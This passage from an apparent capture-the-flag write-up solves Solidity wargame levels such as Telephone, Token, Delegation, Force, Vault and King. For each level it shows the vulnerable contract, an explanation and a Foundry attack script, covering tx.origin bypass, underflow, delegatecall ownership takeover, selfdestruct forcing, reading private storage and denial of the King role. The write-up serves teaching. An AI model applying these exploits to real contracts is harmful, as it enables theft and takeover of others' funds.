</span></code></pre><ul><li>Goal :</ul><ol><li>We have to make the <code>consecutiveWins</code> to 10. We need to guess the coin flip consecutives 10 times.</ol><ul><li>Solution :</ul><ol><li>We can implement the same logic which is used to find the <code>side</code> of the coin in the <code>CoinFlip</code> contract.<li>Write a new Attack contract which will perform the <code>flip()</code> calculation and sends the value to the <code>CoinFlip</code> contract.<li>Since the entire computaion at both contracts happens in same transaction, the <code>block.hash</code> and <code>block.number</code> remains same the both contracts.<li>But we need to run the Attack script 10 times with a small amount of time delay. Because the last blockhash should not be equal to the current blockhash. So, running script at different times will change the block of the transaction.</ol><p><code>CoinFlipSolve.s.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.8</span><span>.</span><span style=color:#0086b3>0</span><span>;
</span><span>
</span><span>contract CoinFlip {
</span><span>
</span><span>  uint256 public consecutiveWins;
</span><span>  uint256 lastHash;
</span><span>  uint256 </span><span style=color:#0086b3>FACTOR </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>57896044618658097711785492504343953926634992332820282019728792003956564819968</span><span>;
</span><span>
</span><span>  </span><span style=color:#795da3;font-weight:700>constructor</span><span>() {
</span><span>    consecutiveWins </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>0</span><span>;
</span><span>  }
</span><span>
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>flip</span><span>(bool _guess) </span><span style=color:#795da3;font-weight:700>public returns </span><span>(bool) {
</span><span>    uint256 blockValue </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>uint256</span><span>(</span><span style=color:#795da3;font-weight:700>blockhash</span><span>(block.number </span><span style=color:#a71d5d;font-weight:700>- </span><span style=color:#0086b3>1</span><span>));
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>if </span><span>(lastHash </span><span style=color:#a71d5d;font-weight:700>== </span><span>blockValue) {
</span><span>      </span><span style=color:#795da3;font-weight:700>revert</span><span>();
</span><span>    }
</span><span>
</span><span>    lastHash </span><span style=color:#a71d5d;font-weight:700>= </span><span>blockValue;
</span><span>    uint256 coinFlip </span><span style=color:#a71d5d;font-weight:700>= </span><span>blockValue </span><span style=color:#a71d5d;font-weight:700>/ </span><span style=color:#0086b3>FACTOR</span><span>;
</span><span>    bool side </span><span style=color:#a71d5d;font-weight:700>= </span><span>coinFlip </span><span style=color:#a71d5d;font-weight:700>== </span><span style=color:#0086b3>1 </span><span style=color:#a71d5d;font-weight:700>? </span><span style=color:#0086b3>true </span><span style=color:#a71d5d;font-weight:700>: </span><span style=color:#0086b3>false</span><span>;
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>if </span><span>(side </span><span style=color:#a71d5d;font-weight:700>== </span><span>_guess) {
</span><span>      consecutiveWins</span><span style=color:#a71d5d;font-weight:700>++</span><span>;
</span><span>      </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#0086b3>true</span><span>;
</span><span>    } </span><span style=color:#a71d5d;font-weight:700>else </span><span>{
</span><span>      consecutiveWins </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>0</span><span>;
</span><span>      </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#0086b3>false</span><span>;
</span><span>    }
</span><span>  }
</span><span>}
</span></code></pre><p>To run script :<pre class=language-bash data-lang=bash style=color:#323232;background-color:#fff><code class=language-bash data-lang=bash><span>$ source .env
</span><span>$ forge script script/CoinFlipSolve.s.sol:CoinFlipSolve --rpc-url $RPC_URL --broadcast
</span></code></pre><h1 id=4-telephone>4 Telephone</h1><p><code>Telephone.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span>
</span><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.8</span><span>.</span><span style=color:#0086b3>0</span><span>;
</span><span>
</span><span>contract Telephone {
</span><span>
</span><span>  address public owner;
</span><span>
</span><span>  </span><span style=color:#795da3;font-weight:700>constructor</span><span>() {
</span><span>    owner </span><span style=color:#a71d5d;font-weight:700>= </span><span>msg.sender;
</span><span>  }
</span><span>
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>changeOwner</span><span>(address _owner) </span><span style=color:#795da3;font-weight:700>public </span><span>{
</span><span>    </span><span style=color:#a71d5d;font-weight:700>if </span><span>(tx.origin </span><span style=color:#a71d5d;font-weight:700>!= </span><span>msg.sender) {
</span><span>      owner </span><span style=color:#a71d5d;font-weight:700>= </span><span>_owner;
</span><span>    }
</span><span>  }
</span><span>}
</span></code></pre><ul><li>Goal</ul><ol><li>Claim the ownership of the Telephone contract</ol><ul><li>Solution</ul><ol><li>Simply call the <code>changeOwner()</code> function from a contract.<li>If the <code>msg.sender</code> is equals to <code>tx.origin</code> which means the call was from a EOA. If its not, then the call is from a contract.<li>EOA is the address which originates any transation in the ethereum.<li>So, we have to call the <code>changeOwner()</code> from an Attack contract.</ol><p><code>TelephoneSolve.s.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.8</span><span>.</span><span style=color:#0086b3>0</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/Script.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/console.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span>{Telephone} </span><span style=color:#a71d5d;font-weight:700>from </span><span style=color:#183691>"../src/Telephone.sol"</span><span>;
</span><span>
</span><span>contract TelephoneSolve is Script{
</span><span>    Telephone public telephone </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>Telephone</span><span>(</span><span style=color:#0086b3>0xbB45D0C7AC29151e0309338a63a7fFEffA348585</span><span>);
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>run</span><span>() </span><span style=color:#795da3;font-weight:700>external</span><span>{
</span><span>        vm.</span><span style=color:#795da3;font-weight:700>startBroadcast</span><span>(vm.</span><span style=color:#795da3;font-weight:700>envUint</span><span>(</span><span style=color:#183691>"PRIVATE_KEY"</span><span>));
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Original Owner : "</span><span>, telephone.</span><span style=color:#795da3;font-weight:700>owner</span><span>());
</span><span>
</span><span>        Attack attack </span><span style=color:#a71d5d;font-weight:700>= new </span><span>Attack(telephone);
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Attack Address : "</span><span>, </span><span style=color:#795da3;font-weight:700>address</span><span>(attack));
</span><span>
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"New Owner : "</span><span>, telephone.</span><span style=color:#795da3;font-weight:700>owner</span><span>());
</span><span>        vm.</span><span style=color:#795da3;font-weight:700>stopBroadcast</span><span>();
</span><span>    }
</span><span>}
</span><span>
</span><span>contract Attack{
</span><span>    Telephone public telephone;
</span><span>    </span><span style=color:#795da3;font-weight:700>constructor</span><span>(Telephone _telephone){
</span><span>        telephone </span><span style=color:#a71d5d;font-weight:700>= </span><span>_telephone;
</span><span>        telephone.</span><span style=color:#795da3;font-weight:700>changeOwner</span><span>(</span><span style=color:#0086b3>0x699BceEbD59a5b52bB586C737cD7ba636f3Fe602</span><span>);
</span><span>    }
</span><span>}
</span></code></pre><p>To run script :<pre class=language-bash data-lang=bash style=color:#323232;background-color:#fff><code class=language-bash data-lang=bash><span>$ source .env
</span><span>$ forge script script/TelephoneSolve.s.sol:TelephoneSolve --rpc-url $RPC_URL --broadcast
</span></code></pre><h1 id=5-token>5 Token</h1><p><code>Token.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.6</span><span>.</span><span style=color:#0086b3>0</span><span>;
</span><span>
</span><span>contract Token {
</span><span>
</span><span>  </span><span style=color:#795da3;font-weight:700>mapping</span><span>(address </span><span style=color:#a71d5d;font-weight:700>=> </span><span>uint) balances;
</span><span>  uint public totalSupply;
</span><span>
</span><span>  </span><span style=color:#795da3;font-weight:700>constructor</span><span>(uint _initialSupply) public {
</span><span>    balances[msg.sender] </span><span style=color:#a71d5d;font-weight:700>= </span><span>totalSupply </span><span style=color:#a71d5d;font-weight:700>= </span><span>_initialSupply;
</span><span>  }
</span><span>
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>transfer</span><span>(address _to, uint _value) </span><span style=color:#795da3;font-weight:700>public returns </span><span>(bool) {
</span><span>    </span><span style=color:#62a35c>require</span><span>(balances[msg.sender] </span><span style=color:#a71d5d;font-weight:700>- </span><span>_value </span><span style=color:#a71d5d;font-weight:700>>= </span><span style=color:#0086b3>0</span><span>);
</span><span>    balances[msg.sender] </span><span style=color:#a71d5d;font-weight:700>-= </span><span>_value;
</span><span>    balances[_to] </span><span style=color:#a71d5d;font-weight:700>+= </span><span>_value;
</span><span>    </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#0086b3>true</span><span>;
</span><span>  }
</span><span>
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>balanceOf</span><span>(address _owner) </span><span style=color:#795da3;font-weight:700>public view returns </span><span>(uint balance) {
</span><span>    </span><span style=color:#a71d5d;font-weight:700>return </span><span>balances[_owner];
</span><span>  }
</span><span>}
</span></code></pre><ul><li>Goal</ul><ol><li>We have initial token balance of 20, we need to get ourself more tokens.</ol><p>Solution :<ol><li>This contract uses solidity pragma <code>0.6.0</code>, in which no arithmetic overflow/underflow checks are not performed by default.<li>In <code>transfer()</code> function the require check can be bypassed when we pass value as more than 20.<li>20 - 21 = -1 which results in <code>2**256 - 1</code>. Which is <code>>= 0</code> and the same will happens in the update of balance at sender.<li><code>balances[msg.sender] -= _value;</code> will become balance[msg.sender] = 20 - 21 = 2**256 - 1.<li>A huge amount of tokens to our account.</ol><p>To run script :<pre class=language-bash data-lang=bash style=color:#323232;background-color:#fff><code class=language-bash data-lang=bash><span>$ source .env
</span><span>$ forge script script/TokenSolve.s.sol:TokenSolve --rpc-url $RPC_URL --broadcast
</span></code></pre><h1 id=6-delegation>6 Delegation</h1><p><code>Delegation.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.8</span><span>.</span><span style=color:#0086b3>0</span><span>;
</span><span>
</span><span>contract Delegate {
</span><span>
</span><span>  address public owner;
</span><span>
</span><span>  </span><span style=color:#795da3;font-weight:700>constructor</span><span>(address _owner) {
</span><span>    owner </span><span style=color:#a71d5d;font-weight:700>= </span><span>_owner;
</span><span>  }
</span><span>
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>pwn</span><span>() </span><span style=color:#795da3;font-weight:700>public </span><span>{
</span><span>    owner </span><span style=color:#a71d5d;font-weight:700>= </span><span>msg.sender;
</span><span>  }
</span><span>}
</span><span>
</span><span>contract Delegation {
</span><span>
</span><span>  address public owner;
</span><span>  Delegate delegate;
</span><span>
</span><span>  </span><span style=color:#795da3;font-weight:700>constructor</span><span>(address _delegateAddress) {
</span><span>    delegate </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>Delegate</span><span>(_delegateAddress);
</span><span>    owner </span><span style=color:#a71d5d;font-weight:700>= </span><span>msg.sender;
</span><span>  }
</span><span>
</span><span>  </span><span style=color:#795da3;font-weight:700>fallback</span><span>() external {
</span><span>    (bool result,) </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>address</span><span>(delegate).</span><span style=color:#795da3;font-weight:700>delegatecall</span><span>(msg.data);
</span><span>    </span><span style=color:#a71d5d;font-weight:700>if </span><span>(result) {
</span><span>      this;
</span><span>    }
</span><span>  }
</span><span>}
</span></code></pre><ul><li>Goal</ul><ol><li>Claim ownership of Delegation contract</ol><ul><li>Solution</ul><ol><li><code>Delegation</code> contracts uses delegatecall to call the other contract <code>Delegate</code>.<li>One thing to remember with delegatecall is that it will maintain the <code>msg.sender</code> and <code>msg.value</code> when it calls other contract.<li>And also it updates the caller contract storage not the contract which being called.<li>So, when we call <code>pwn()</code> on the Delegation address it will forward the call to Delegate contract and updates the owner variable in Delegation contract.</ol><p><code>DelegationSolve.s.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.8</span><span>.</span><span style=color:#0086b3>0</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/Script.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/console.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"../src/Delegation.sol"</span><span>;
</span><span>
</span><span>
</span><span>contract DelegationSolve is Script{
</span><span>    Delegation public delegation </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>Delegation</span><span>(</span><span style=color:#0086b3>0xFb9BeF4E9A8d68C2Bc2c4D2dE5688fbe0e8224F2</span><span>);
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>run</span><span>() </span><span style=color:#795da3;font-weight:700>external</span><span>{
</span><span>        vm.</span><span style=color:#795da3;font-weight:700>startBroadcast</span><span>();
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Initial Owner : "</span><span>, delegation.</span><span style=color:#795da3;font-weight:700>owner</span><span>());
</span><span>        
</span><span>        </span><span style=color:#795da3;font-weight:700>address</span><span>(delegation).</span><span style=color:#62a35c>call</span><span>(abi.</span><span style=color:#795da3;font-weight:700>encodeWithSignature</span><span>(</span><span style=color:#183691>"pwn()"</span><span>));
</span><span>
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Final Owner : "</span><span>, delegation.</span><span style=color:#795da3;font-weight:700>owner</span><span>());
</span><span>        
</span><span>        vm.</span><span style=color:#795da3;font-weight:700>stopBroadcast</span><span>();
</span><span>    }
</span><span>}
</span></code></pre><p>To run script :<pre class=language-bash data-lang=bash style=color:#323232;background-color:#fff><code class=language-bash data-lang=bash><span>$ source .env
</span><span>$ forge script script/DelegationSolve.s.sol:DelegationSolve --rpc-url $RPC_URL --broadcast
</span></code></pre><h1 id=7-force>7 Force</h1><p><code>Force.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.8</span><span>.</span><span style=color:#0086b3>0</span><span>;
</span><span>
</span><span>contract Force {</span><span style=color:#969896;font-style:italic>/*
</span><span style=color:#969896;font-style:italic>
</span><span style=color:#969896;font-style:italic>                   MEOW ?
</span><span style=color:#969896;font-style:italic>         /\_/\   /
</span><span style=color:#969896;font-style:italic>    ____/ o o \
</span><span style=color:#969896;font-style:italic>  /~____  == /
</span><span style=color:#969896;font-style:italic> (______)__m_m)
</span><span style=color:#969896;font-style:italic>
</span><span style=color:#969896;font-style:italic>*/</span><span>}
</span></code></pre><ul><li>Goal</ul><ol><li>We need to make the balance of the Force contract more than 0.</ol><ul><li>Solution</ul><ol><li>There is no <code>receive()/fallback()</code> function and no payable functions in the Force contract.<li>If we send any ether to this contract it will be reverted.<li>There are more ways to receive ether not just <code>receive()/fallback()</code>.<li>Ether can be received via coinbase transaction, i.e a mining reward.<li>Also when someone called selfdestruct on any contract and mentioned our address in the recepient of the ether after selftdestruct.<li>So, we can deploy a contract with some ether and implement a selfdestruct function and pass the recepient as the <code>Force</code> contract address.<li>Upon selfdestruct of the Attack contract it Force contract will receive ether.</ol><p><code>ForceSolve.s.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.8</span><span>.</span><span style=color:#0086b3>0</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/Script.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/console.sol"</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import </span><span>{Force} </span><span style=color:#a71d5d;font-weight:700>from </span><span style=color:#183691>"../src/Force.sol"</span><span>;
</span><span>
</span><span>contract ForceSolve is Script {
</span><span>    Force public force </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>Force</span><span>(</span><span style=color:#0086b3>0xef1ec80b578969a99B840745178d655f3594Db99</span><span>);
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>run</span><span>() </span><span style=color:#795da3;font-weight:700>external</span><span>{
</span><span>        vm.</span><span style=color:#795da3;font-weight:700>startBroadcast</span><span>(vm.</span><span style=color:#795da3;font-weight:700>envUint</span><span>(</span><span style=color:#183691>"PRIVATE_KEY"</span><span>));
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"balance of Force : "</span><span>, </span><span style=color:#795da3;font-weight:700>address</span><span>(force).balance);
</span><span>        </span><span style=color:#a71d5d;font-weight:700>new </span><span>Attack{value</span><span style=color:#a71d5d;font-weight:700>: </span><span style=color:#0086b3>100 </span><span>wei}().</span><span style=color:#795da3;font-weight:700>exploit</span><span>(</span><span style=color:#795da3;font-weight:700>payable</span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(force)));
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"balance of Force : "</span><span>, </span><span style=color:#795da3;font-weight:700>address</span><span>(force).balance);
</span><span>        vm.</span><span style=color:#795da3;font-weight:700>stopBroadcast</span><span>();
</span><span>    }
</span><span>}
</span><span>
</span><span>contract Attack{
</span><span>    address public owner;
</span><span>    </span><span style=color:#795da3;font-weight:700>constructor</span><span>() payable {
</span><span>        owner </span><span style=color:#a71d5d;font-weight:700>= </span><span>msg.sender;
</span><span>    }
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>exploit</span><span>(address payable _fundReceiver) </span><span style=color:#795da3;font-weight:700>public </span><span>{
</span><span>        </span><span style=color:#62a35c>require</span><span>(msg.sender </span><span style=color:#a71d5d;font-weight:700>== </span><span>owner);
</span><span>        </span><span style=color:#795da3;font-weight:700>selfdestruct</span><span>(_fundReceiver);
</span><span>    }
</span><span>
</span><span>}
</span></code></pre><p>To run script :<pre class=language-bash data-lang=bash style=color:#323232;background-color:#fff><code class=language-bash data-lang=bash><span>$ source .env
</span><span>$ forge script script/ForceSolve.s.sol:ForceSolve --rpc-url $RPC_URL --broadcast
</span></code></pre><h1 id=8-vault>8 Vault</h1><p><code>Vault.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.8</span><span>.</span><span style=color:#0086b3>0</span><span>;
</span><span>
</span><span>contract Vault {
</span><span>  bool public locked;
</span><span>  bytes32 private password;
</span><span>
</span><span>  </span><span style=color:#795da3;font-weight:700>constructor</span><span>(bytes32 _password) {
</span><span>    locked </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>true</span><span>;
</span><span>    password </span><span style=color:#a71d5d;font-weight:700>= </span><span>_password;
</span><span>  }
</span><span>
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>unlock</span><span>(bytes32 _password) </span><span style=color:#795da3;font-weight:700>public </span><span>{
</span><span>    </span><span style=color:#a71d5d;font-weight:700>if </span><span>(password </span><span style=color:#a71d5d;font-weight:700>== </span><span>_password) {
</span><span>      locked </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>false</span><span>;
</span><span>    }
</span><span>  }
</span><span>}
</span></code></pre><ul><li>Goal</ul><ol><li>We need to unlock the vault.</ol><ul><li>Solution</ul><ol><li>We can simply call the <code>unlock()</code> function with password. But the password was not publicly accessible.<li>Declaring a variable <code>private</code> doesn't mean that no one can read that variable. Only the other contracts which interacts with it won't able to view that variable.<li>Anyone from off-chain can easily query that value. We see that password is stored in storage slot 1.<li>We can use foundry cheatcode <code>vm.load</code> to read password and call the <code>unlock()</code> to unlock the vault.</ol><p><code>VaultSolve.s.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.8</span><span>.</span><span style=color:#0086b3>0</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/Script.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/console.sol"</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import </span><span>{Vault} </span><span style=color:#a71d5d;font-weight:700>from </span><span style=color:#183691>"../src/Vault.sol"</span><span>;
</span><span>
</span><span>contract VaultSolve is Script {
</span><span>    Vault public vault </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>Vault</span><span>(</span><span style=color:#0086b3>0x80C30D2FE8e45F588d70bc5D530939c7f1b22f94</span><span>);
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>run</span><span>() </span><span style=color:#795da3;font-weight:700>external</span><span>{
</span><span>        vm.</span><span style=color:#795da3;font-weight:700>startBroadcast</span><span>(vm.</span><span style=color:#795da3;font-weight:700>envUint</span><span>(</span><span style=color:#183691>"PRIVATE_KEY"</span><span>));
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Vault locked : "</span><span>, vault.</span><span style=color:#795da3;font-weight:700>locked</span><span>());
</span><span>        bytes32 password </span><span style=color:#a71d5d;font-weight:700>= </span><span>vm.</span><span style=color:#62a35c>load</span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(vault), </span><span style=color:#795da3;font-weight:700>bytes32</span><span>(</span><span style=color:#795da3;font-weight:700>uint256</span><span>(</span><span style=color:#0086b3>1</span><span>)));
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#795da3;font-weight:700>logBytes32</span><span>(password);
</span><span>        vault.</span><span style=color:#795da3;font-weight:700>unlock</span><span>(password);
</span><span>
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Vault locked : "</span><span>, vault.</span><span style=color:#795da3;font-weight:700>locked</span><span>());
</span><span>        vm.</span><span style=color:#795da3;font-weight:700>stopBroadcast</span><span>();
</span><span>    }
</span><span>}
</span></code></pre><p>To run script :<pre class=language-bash data-lang=bash style=color:#323232;background-color:#fff><code class=language-bash data-lang=bash><span>$ source .env
</span><span>$ forge script script/VaultSolve.s.sol:VaultSolve --rpc-url $RPC_URL --broadcast
</span></code></pre><h1 id=9-king>9 King</h1><p><code>King.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.8</span><span>.</span><span style=color:#0086b3>0</span><span>;
</span><span>
</span><span>contract King {
</span><span>
</span><span>  address king;
</span><span>  uint public prize;
</span><span>  address public owner;
</span><span>
</span><span>  </span><span style=color:#795da3;font-weight:700>constructor</span><span>() payable {
</span><span>    owner </span><span style=color:#a71d5d;font-weight:700>= </span><span>msg.sender;  
</span><span>    king </span><span style=color:#a71d5d;font-weight:700>= </span><span>msg.sender;
</span><span>    prize </span><span style=color:#a71d5d;font-weight:700>= </span><span>msg.value;
</span><span>  }
</span><span>
</span><span>  </span><span style=color:#795da3;font-weight:700>receive</span><span>() external payable {
</span><span>    </span><span style=color:#62a35c>require</span><span>(msg.value </span><span style=color:#a71d5d;font-weight:700>>= </span><span>prize </span><span style=color:#a71d5d;font-weight:700>|| </span><span>msg.sender </span><span style=color:#a71d5d;font-weight:700>== </span><span>owner);
</span><span>    </span><span style=color:#795da3;font-weight:700>payable</span><span>(king).</span><span style=color:#795da3;font-weight:700>transfer</span><span>(msg.value);
</span><span>    king </span><span style=color:#a71d5d;font-weight:700>= </span><span>msg.sender;
</span><span>    prize </span><span style=color:#a71d5d;font-weight:700>= </span><span>msg.value;
</span><span>  }
</span><span>
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>_king</span><span>() </span><span style=color:#795da3;font-weight:700>public view returns </span><span>(address) {
</span><span>    </span><span style=color:#a71d5d;font-weight:700>return </span><span>king;
</span><span>  }
</span><span>}
</span><span>
</span></code></pre><ul><li>Goal</ul><ol><li>Be the <code>King</code> and make others dont claim the <code>King</code> position again.</ol><ul><li>Solution</ul><ol><li>Initially check the <code>prize</code> amount that need to send to be the king. And send the <code>prize</code> amount to the <code>King</code> contract.<li>When someone send the <code>prize</code> amount back to us to claim the king position, we can deny the money.<li>So, that they wont be the king anymore.<li>In order to deny the prize, we can write a contract which sends prize to the king contract and dont implement any <code>receive()/fallback()</code> function.<li>This will revert others transaction when they sends prize to us, So, we will remain as the king.</ol><p><code>KingSolve.s.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.8</span><span>.</span><span style=color:#0086b3>0</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/Script.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/console.sol"</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import </span><span>{King} </span><span style=color:#a71d5d;font-weight:700>from </span><span style=color:#183691>"../src/King.sol"</span><span>;
</span><span>
</span><span>contract KingSolve is Script {
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>run</span><span>() </span><span style=color:#795da3;font-weight:700>external</span><span>{
</span><span>        vm.</span><span style=color:#795da3;font-weight:700>startBroadcast</span><span>(vm.</span><span style=color:#795da3;font-weight:700>envUint</span><span>(</span><span style=color:#183691>"PRIVATE_KEY"</span><span>));
</span><span>        King king </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>King</span><span>(</span><span style=color:#795da3;font-weight:700>payable</span><span>(</span><span style=color:#0086b3>0xCF1EE241C905C39Add26C82d4a2CCcBC6D070fC2</span><span>));
</span><span>        uint _prize </span><span style=color:#a71d5d;font-weight:700>= </span><span>king.</span><span style=color:#795da3;font-weight:700>prize</span><span>();
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Current King : "</span><span>, king.</span><span style=color:#795da3;font-weight:700>_king</span><span>());
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Current Prize : "</span><span>,_prize);
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>new </span><span>Attack().exploit{value: _prize}();
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Final King : "</span><span>, king.</span><span style=color:#795da3;font-weight:700>_king</span><span>());
</span><span>        vm.</span><span style=color:#795da3;font-weight:700>stopBroadcast</span><span>();
</span><span>    }
</span><span>}
</span><span>
</span><span>contract Attack{
